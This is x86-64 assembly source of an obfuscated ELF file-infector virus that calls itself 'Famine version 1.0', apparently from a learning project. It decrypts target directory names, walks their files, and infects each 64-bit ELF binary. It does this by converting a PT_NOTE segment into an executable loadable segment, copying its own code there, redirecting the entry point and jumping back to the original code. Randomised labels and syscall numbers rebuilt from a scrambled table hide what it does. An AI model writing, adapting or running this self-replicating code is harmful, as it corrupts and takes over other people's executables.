; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing vIpwyUO8 on the stack
push rbp
mov rbp, rsp
PUSHA
call _map_int_table
lea rdi, [rel AGG22EWL]     ; dir to open for arg readDir
mov rsi, cQZDYf2Uk
call HnbfY

lea rdi, [rel PKN8uGw6P]
mov rsi, wWXKWUc
call HnbfY
OM7Q6FJ:
POPA
mov rsp, rbp
pop rbp
Y8U3P:
jmp mj9YXte

; take directory to open in rdi && size of pwd on rsi
HnbfY:
push rbp
mov rbp, rsp
push rax
push rsi
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
sub rsp, vIpwyUO8_size
push rsi
lea r8, FAM(vIpwyUO8.DmWCpO9p0X)
or qword [r8], -1
lea r8, FAM(vIpwyUO8.JVrBRyDiHX)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(vIpwyUO8.r6ieUyrMx)
mov [r8], rsi
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 92]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 152]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 212]
or  rax, r14 
pop r14
pop r15
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the MVG2ahP0Fc size back to unmap
jl tLme96eBX
lea rdi, FAM(vIpwyUO8.DmWCpO9p0X)             ; enregistre le DmWCpO9p0X dans la struct
mov [rdi], rax

c4jZtAVA:
lea r10, FAM(vIpwyUO8.DmWCpO9p0X)
mov rdi, [r10]
lea r9, FAM(vIpwyUO8.gFNJOS)              ; init gFNJOS
mov DWORD [r9], 0 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 49]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 109]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 169]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 229]
or  rax, r14 
pop r14
pop r15
lea rsi, FAM(vIpwyUO8.TSyoY9O)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 21]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 81]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 141]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 201]
or  rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jle tLme96eBX

lea r10, FAM(vIpwyUO8.yHYam1PN3q)  ; r10 -> (struct vIpwyUO8.diretents_struct_ptr)
mov [r10], rsi                           ; vIpwyUO8.yHYam1PN3q -> vIpwyUO8.TSyoY9O
lea r11, FAM(vIpwyUO8.gQwXpO)       ; r11 -> (struct vIpwyUO8.gQwXpO)
mov DWORD [r11], eax 

uiYOOLJ:
lea r8, FAM(vIpwyUO8.gFNJOS)        ; r8 -> total lu de getdents
lea r9, FAM(vIpwyUO8.gQwXpO)        ; r9 -> total a lire de getdents
mov r10, FAM(vIpwyUO8.yHYam1PN3q)  ; r10 -> actual dirent struct
lea r11, FAM(vIpwyUO8.yHYam1PN3q)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; vIpwyUO8.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8
jne zTzKqKcV

zJUDpkNsU:
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
sub rsi, FAM(vIpwyUO8.r6ieUyrMx)
mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
call jzzLQ

GRF2EB:
call YKlp7Xhrmy

zTzKqKcV:
mov r8, FAM(vIpwyUO8.gFNJOS)
mov r12, FAM(vIpwyUO8.gQwXpO)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
mov rsi, FAM(vIpwyUO8.r6ieUyrMx)
jge c4jZtAVA
jmp uiYOOLJ

YKlp7Xhrmy:
push rbp
mov rbp, rsp
sub rsp, Hp2r39UiMa_size
lea rax, INF(Hp2r39UiMa.dPrJVU)
mov qword [rax], 0 
lea rax, INF(Hp2r39UiMa.lCqTjEOuD)
mov byte [rax], 0 
lea rax, INF(Hp2r39UiMa.Ic9xq)
mov qword [rax], 0 

Dg4isfxHc:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 92]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 152]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 212]
or  rax, r14 
pop r14
pop r15
mov rdi, rsi
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 52]
shl r14, 0x18
mov  rsi, r14 
movzx r14, byte [r15 + 112]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 172]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 232]
or  rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
cmp rax, 0x0 
jl TEi4b7Y
mov INF(Hp2r39UiMa.MAo60), rax

; === get file size ===
EIXOrtpM:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 46]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 106]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 166]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 226]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(Hp2r39UiMa.MAo60)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rsi, r14 
movzx r14, byte [r15 + 61]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 181]
or  rsi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 32]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 92]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 152]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 212]
or  rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jle GmE4xR
mov INF(Hp2r39UiMa.UFNesJv4q), rax
mov INF(Hp2r39UiMa.Tdlff), rax

VrW8XkdeW:
; rax -> map
mov rsi, rax        ; rsi = file_size
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 36]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 96]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 156]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 216]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 61]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 181]
or  rdi, r14 
pop r14
pop r15
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 64]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 124]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 184]
or  r10, r14 
pop r14
pop r15
mov r8, INF(Hp2r39UiMa.MAo60)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r9, r14 
movzx r14, byte [r15 + 61]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 181]
or  r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl GmE4xR
lea r8, INF(Hp2r39UiMa.pNsDtvOr)
mov [r8], rax

nq579qu6Fg:
cmp dword [rax + 1], 0x02464c45 
jne KPfZtUUwNJ

Nyl73ugQ2H:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + h2viU9O.P4fER3Gm8m]
xor rcx, rcx
lh4wW:
cmp cx, [r15  + h2viU9O.h2FSBoG]
jge KTgop9K2DP 
add r14, qtnMX2NULe_size
inc rcx
jmp lh4wW
KTgop9K2DP:
mov INF(Hp2r39UiMa.r7B5uVRYUF), r14
xor r9, r9
mqcBnBta:
cmp cx, 0 
jle ZMUZyTnMG
T6MdiI6:
bt word [r14], 0 
jnc KZlSfCdiHe
bt qword [r14], 0x20 
jc fnlvnZ
KZlSfCdiHe:
dec rcx
sub r14, qtnMX2NULe_size
jmp mqcBnBta

ZMUZyTnMG:
mov r9, INF(Hp2r39UiMa.dPrJVU)
cmp r9, 0 
je KPfZtUUwNJ
cmp byte INF(Hp2r39UiMa.lCqTjEOuD), 1 
je I9FVgzQC
jmp VjVbY4PaF          ; else jmp VjVbY4PaF

fnlvnZ:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
DAWe8rZPe:
; r8 -> potential hrQyImQKGS
; r9 == hrQyImQKGS variable
mov r8, r15
add r8, [r14 + qtnMX2NULe.BYNKkr]
add r8, [r14 + qtnMX2NULe.Hhvm9Q0pHM]
sub r8, tl4Qd
; mov r9, [rel hrQyImQKGS]
lea r9, hrQyImQKGS
; mov rdi, r9
; mov rsi, tl4Qd
; push rax
; call _decrypt_str
; mov r9, rax
; pop rax
mov r10, [r9]
cmp qword r10, [r8]
je KPfZtUUwNJ
mov rdi, r9
mov rsi, tl4Qd
push rcx
call PoZPrnQH
pop rcx

hwxXOleu8:
mov r9, INF(Hp2r39UiMa.dPrJVU)
test r9, r9
jz jAnJDmS
mov r9, INF(Hp2r39UiMa.lCqTjEOuD)
test r9, r9
jz KZlSfCdiHe

jAnJDmS:
; r8 == end of Hp2r39UiMa offset
; r9 == next segment offset
mov r8, [r14 + qtnMX2NULe.BYNKkr]
add r8, [r14 + qtnMX2NULe.Hhvm9Q0pHM]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, qtnMX2NULe_size
add r9, qtnMX2NULe.BYNKkr
cmp [r9], r8
setb INF(Hp2r39UiMa.lCqTjEOuD)   ; if ([r9] < r8) { Hp2r39UiMa.lCqTjEOuD = 1) }

M1h6UqTg:
; r8 -> Hp2r39UiMa structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (jAnJDmS)
;*r14 -> segment header in header table
lea r8, INF(Hp2r39UiMa.VeISq2)
mov [r8], cl
lea r8, INF(Hp2r39UiMa.vAk49lW)
mov r12, [r15 + h2viU9O.XNvDp]
mov [r8], r12
lea r8, INF(Hp2r39UiMa.dPrJVU)
mov [r8], r13
lea r8, INF(Hp2r39UiMa.R44md3)
push r9
mov r9, [r14 + qtnMX2NULe.kdixMj]
add r9, [r14 + qtnMX2NULe.tEUTYFr8]
mov [r8], r9
pop r9
lea r8, INF(Hp2r39UiMa.CheopBjw)
mov [r8], r14
jmp KZlSfCdiHe

I9FVgzQC:
cX2uppDQGt:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 48]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 108]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 168]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 228]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(Hp2r39UiMa.MAo60)
lea rsi, INF(Hp2r39UiMa.UFNesJv4q)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl KPfZtUUwNJ

ziFjFIavvm:
mov rdi, INF(Hp2r39UiMa.pNsDtvOr)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 47]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 107]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 167]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 227]
or  rax, r14 
pop r14
pop r15
syscall

k24kb:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 36]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 96]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 156]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 216]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 61]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 181]
or  rdi, r14 
pop r14
pop r15
mov rsi, INF(Hp2r39UiMa.UFNesJv4q)    ; rsi = file_size
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 64]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 124]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 184]
or  r10, r14 
pop r14
pop r15
mov r8, INF(Hp2r39UiMa.MAo60)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r9, r14 
movzx r14, byte [r15 + 61]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 121]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 181]
or  r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl GmE4xR
lea r8, INF(Hp2r39UiMa.pNsDtvOr)
mov [r8], rax

Vab9IlH2j:
mov r14, INF(Hp2r39UiMa.pNsDtvOr)
movzx rax, word [r14 + h2viU9O.aoWnmX]
add r14, [r14 + h2viU9O.pCtMgY]
xor rcx, rcx

FxgpZQW:
cmp rcx, rax
jge i8EwVy
mov rbx, [r14 + PNvMO0.XSvoqKsb]
add rbx, [r14 + PNvMO0.qjUZ9VvHE]
cmp INF(Hp2r39UiMa.Ic9xq), rbx
jge gPXJd
mov INF(Hp2r39UiMa.Ic9xq), rbx

gPXJd:
add r14, PNvMO0_size
inc rcx
jmp FxgpZQW

i8EwVy:

QaVOLl:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(Hp2r39UiMa.pNsDtvOr)
movzx rax, word [r14 + h2viU9O.h2FSBoG]
add r14, [r14 + h2viU9O.P4fER3Gm8m]
xor rcx, rcx

tOj9ySF:
cmp rcx, rax
jge DFqzY
cmp dword [r14 + qtnMX2NULe.ngVI1xF], 0x4
je l28dBdvpAF

EHS0M:
add r14, qtnMX2NULe_size
inc rcx
jmp tOj9ySF

DFqzY:
mov r14, -1 

l28dBdvpAF:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl zDse7
mov dword [r14 + qtnMX2NULe.ngVI1xF], 0x1
mov qword [r14 + qtnMX2NULe.a28Bo], 0x1| 0x4
mov qword [r14 + qtnMX2NULe.Hhvm9Q0pHM], CODE_LEN 
mov qword [r14 + qtnMX2NULe.tEUTYFr8], CODE_LEN 
mov qword [r14 + qtnMX2NULe.u2fIzVy], 0x1000 
mov rax, INF(Hp2r39UiMa.Tdlff)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + qtnMX2NULe.BYNKkr], rax
mov qword INF(Hp2r39UiMa.dPrJVU), rax
mov rax, INF(Hp2r39UiMa.Ic9xq)
add rax, 0x1000 
and rax, -4096
mov qword INF(Hp2r39UiMa.R44md3), rax
mov qword [r14 + qtnMX2NULe.kdixMj], rax
mov qword [r14 + qtnMX2NULe.mh61y], rax

VjVbY4PaF:
duditwbLa:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(Hp2r39UiMa.pNsDtvOr)
add r8, h2viU9O.XNvDp
mov r10, INF(Hp2r39UiMa.R44md3)
mov [r8], r10
cmp byte INF(Hp2r39UiMa.lCqTjEOuD), 0 
jg p1hbaxkOK
mov rdi, CODE_LEN 
call BLp89WFxH

p1hbaxkOK:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (sffRnF - _start)
mov rdi, INF(Hp2r39UiMa.pNsDtvOr)
add rdi, INF(Hp2r39UiMa.dPrJVU)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN 
cld          ; copy from _start to sffRnF (= !std)
rep movsb

zDse7:
; r8 -> Y8U3P instruction's addr (Y8U3P + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(Hp2r39UiMa.pNsDtvOr)
add r8, INF(Hp2r39UiMa.dPrJVU)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(Hp2r39UiMa.R44md3)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(Hp2r39UiMa.vAk49lW)
sub r9, r10
mov [r8], r9d
jmp KPfZtUUwNJ

BLp89WFxH:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(Hp2r39UiMa.CheopBjw)
push r8           ; save header start for later

; * Update file size *
add r8, qword qtnMX2NULe.Hhvm9Q0pHM
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, qtnMX2NULe.tEUTYFr8
add qword [r8], rdi

ret

KPfZtUUwNJ:
lea rdi, INF(Hp2r39UiMa.pNsDtvOr)
lea rsi, INF(Hp2r39UiMa.UFNesJv4q)
call PoZPrnQH
jmp GmE4xR

PoZPrnQH:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 47]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 107]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 167]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 227]
or  rax, r14 
pop r14
pop r15
syscall
ret

GmE4xR:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 33]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 93]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 153]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 213]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(Hp2r39UiMa.MAo60)
syscall
mov qword INF(Hp2r39UiMa.MAo60), -1
jmp TEi4b7Y

tLme96eBX:
mov rdi, FAM(vIpwyUO8.DmWCpO9p0X)
cmp rdi, 0 
jle TEi4b7Y
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 33]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 93]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 153]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 213]
or  rax, r14 
pop r14
pop r15
syscall
mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
mov rsi, FAM(vIpwyUO8.r6ieUyrMx)
call PoZPrnQH
or qword FAM(vIpwyUO8.DmWCpO9p0X), -1
jmp TEi4b7Y

TEi4b7Y:
leave
ret

mj9YXte:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
jzzLQ:
xor rcx, rcx
sWvwOxs2:
cmp byte [rdi + rcx], 0 
je TqewbJXXR4
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp sWvwOxs2

TqewbJXXR4:

ret

; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
mov rax, SYS_MMAP
mov rdi, 0x0
mov rsi, 0xf0
mov rdx, PROT_READ | PROT_WRITE
mov r10, 0x22
mov r8, -1
mov r9, 0x0
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000200
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00000000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00004600
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x00000000
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x04000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00004c00
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00001000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x66000000
mov dword [rax + 180], 0x00000040
mov dword [rax + 184], 0x00000001
mov dword [rax + 188], 0x00004501
mov dword [rax + 192], 0x00012000
mov dword [rax + 196], 0x01000101
mov dword [rax + 200], 0x01000000
mov dword [rax + 204], 0x003c0005
mov dword [rax + 208], 0x01030001
mov dword [rax + 212], 0x00220302
mov dword [rax + 216], 0x00000009
mov dword [rax + 220], 0x00000045
mov dword [rax + 224], 0x0b084400
mov dword [rax + 228], 0x0100d94d
mov dword [rax + 232], 0x12100802
mov dword [rax + 236], 0x89070413
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len hQ26B
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> hQ26B
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi                    ; addr = NULL (let kernel choose)
mov rdx, 0x03                   ; PROT_READ | PROT_WRITE = 1 | 2 = 3
mov r10, 0x22                   ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
mov r8, -1                      ; DmWCpO9p0X = -1
xor r9, r9                      ; offset = 0
mov rax, 9                      ; syscall number for mmap
syscall
cmp rax, 0
jl _decrypt_loop_end
mov r11, rax
lea rsi, hQ26B
call k2u1J7M
mov r9, rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
mov rax, rcx
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
 
;; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
u7w0sUhH:
;; rax == div quotient
;; rbx -> to_decrypt
;; rcx == counter
;; rdx == div modulo
;; r9 == len hQ26B
;; r10 -> key_char
;; r11 -> decrypted str (mmap)
;; r12 == len to_decrypt
;; rsi -> hQ26B
;push rbx
;push rcx
;push rdx
;push r8
;push r9
;push r10
;push r11
;push r12
;mov rbx, rdi
;mov r12, rsi



;mov r8, -1                      ; DmWCpO9p0X = -1


;syscall

;jl _decrypt_loop_end
;mov r11, rax
;lea rsi, hQ26B
;call k2u1J7M
;mov r9, rax
;xor rcx, rcx
;xor rdx, rdx
nhhrFTJfVg:
;cmp rcx, r12
;jge _decrypt_loop_end
;mov rax, rcx
;xor rdx, rdx

;jne _no_zero
;xor rax, rax
;jmp _end_div
kNYRlr74:
;div r9
TNMTro5Y5:
;movzx r10, byte [rsi + rdx] ; r10 == hQ26B[rcx % hQ26B_len]
;xor r10b, [rbx + rcx]
;mov [r11 + rcx], r10b
;inc rcx
;jmp _decrypt_loop
lr3PpvV3:
;mov rax, r11
;pop r12
;pop r11
;pop r10
;pop r9
;pop r8
;pop rdx
;pop rcx
;pop rbx
;ret

; debug
; strlen(str:rsi)
k2u1J7M:
xor rcx, rcx

VKpp7VpO:
cmp byte [rsi + rcx], 0 
je pAxDz
inc rcx
jmp VKpp7VpO

pAxDz:
mov rax, rcx
ret


adVCs dq 0x45 
MVG2ahP0Fc db 0x29, 0x00, 0x32, 0x0F, 0x17, 0x5F, 0x17, 0x24, 0x1B, 0x25, 0x4A, 0x5B, 0x0F, 0x53 
AGG22EWL db 0x47, 0x27, 0x36, 0x12, 0x48, 0x47, 0x17, 0x04, 0x1B, 0x57 
cQZDYf2Uk    equ $ - AGG22EWL
PKN8uGw6P db 0x47, 0x27, 0x36, 0x12, 0x48, 0x47, 0x17, 0x04, 0x1B, 0x65, 0x23 
wWXKWUc    equ $ - PKN8uGw6P
hQ26B db 0x68, 0x53, 0x5B, 0x62, 0x67, 0x33, 0x72, 0x77, 0x6F, 0x57, 0x23, 0x35 
OElSK5C db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
hrQyImQKGS db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
tl4Qd equ $ - hrQyImQKGS
sffRnF: 